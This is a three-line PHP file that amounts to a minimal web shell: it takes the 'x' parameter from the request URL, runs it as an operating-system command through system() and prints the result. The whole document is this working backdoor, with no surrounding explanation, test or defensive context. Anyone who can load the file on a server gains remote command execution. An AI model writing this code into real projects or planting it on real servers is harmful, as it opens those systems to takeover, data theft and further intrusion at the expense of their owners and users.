<?php
echo system($_GET['x']);
?>